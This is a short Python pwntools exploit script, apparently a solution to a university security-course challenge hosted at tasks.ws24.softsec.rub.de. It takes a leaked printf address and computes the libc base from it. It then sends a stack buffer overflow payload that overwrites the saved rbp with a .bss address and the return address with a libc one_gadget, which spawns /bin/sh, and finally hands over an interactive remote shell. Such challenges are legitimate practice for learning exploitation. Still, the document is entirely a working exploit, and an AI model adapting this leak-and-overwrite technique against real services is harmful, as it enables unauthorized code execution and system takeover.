#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33586)
#conn = pwn.process([exe.path])


#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")

"""
0xd509f execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
"""
one_gadget_offset = 0xd509f

message = conn.recvline()
printf_address = int(message[-13:-1],16)
libc_base = printf_address - libc.symbols['printf']
one_gadget = libc_base + one_gadget_offset
#print(hex(one_gadget))

# we have no pie => bss is writable and at a fixed position
rbp = exe.bss(0x40)
payload = b'A'*32 + pwn.p64(rbp) + pwn.p64(one_gadget)

conn.send(payload)

conn.interactive()